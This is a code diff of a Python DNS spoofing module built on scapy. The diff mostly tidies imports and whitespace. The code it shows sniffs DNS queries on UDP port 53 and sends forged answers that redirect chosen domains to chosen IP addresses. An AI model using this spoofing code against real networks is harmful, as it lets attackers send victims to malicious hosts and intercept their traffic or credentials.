@@ -1,13 +1,10 @@
 """This package contains everything related to DNS spoofing"""
 
-import click
-from functions.general import *
-from functions.domains import *
 import threading
-from scapy.all import DNS, UDP, IP, DNSRR, DNSQR , sr1, send, sniff, sendp
-from scapy.layers.l2 import Ether
 import time
-import os
+import click
+from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
+from functions.domains import get_domains
 
 interface = "udp port 53"
 
@@ -62,9 +59,9 @@ def analyze_packet(packet, table):
     # filter out answers
     if packet[DNS].qr != 0:
         return
-    
+
     query_name = get_packet_query_name(packet[DNS])
-    
+
     if query_name in table:
         print(f'Found a query to spoof: {query_name}')
         spoof_packet(packet, query_name, table[query_name])
@@ -72,9 +69,6 @@ def analyze_packet(packet, table):
 
 
 def spoof_packet(packet, spoofed_domain, spoofed_ip):
-    # print(f"[SPOOFING]: Packet {packet.summary()}\n")
-    # print(f"\t[SPOOFING] Before: \n {packet.show()}")
-
     # Make DNS template message
     spoofed_reply = IP() / UDP() / DNS()
 
@@ -90,7 +84,7 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip):
     # set query to response
     spoofed_reply[DNS].qr = 1
     spoofed_reply[DNS].aa = 0
-    
+
     # pass the DNS Question Record to the resposne
     spoofed_reply[DNS].qd = packet[DNS].qd
 
@@ -104,7 +98,7 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip):
 
 def get_packet_query_name(dns_packet):
     name = dns_packet.qd.qname[:-1].decode()
-    
+
     # Remove "www." from the beginning of the name
     if name.startswith("www."):
         name = name[4:]
